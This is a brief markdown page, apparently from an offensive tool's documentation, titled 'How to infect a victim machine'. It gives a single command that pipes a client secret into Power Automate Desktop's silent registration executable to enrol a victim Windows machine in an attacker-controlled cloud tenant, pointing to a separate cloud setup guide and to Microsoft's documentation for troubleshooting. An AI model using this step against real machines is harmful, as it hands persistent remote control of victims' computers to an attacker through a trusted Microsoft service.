# How to infect a victim machine

To register a victim machine, recall the _<applicationId>_, _<tenantId>_ and _<secret>_ you got from following the [cloud setup guide](cloud_setup.md) and run the following command

   `echo <secret> | C:\Program Files (x86)\Power Automate Desktop\PAD.MachineRegistration.Silent.exe -register -applicationid <applicationId> -tenantid <tenantId> -clientsecret -force`

That's it! For troubleshooting, refer to [Microsoft Docs](https://docs.microsoft.com/en-us/power-automate/desktop-flows/machines-silent-registration#silently-register-a-new-machine).
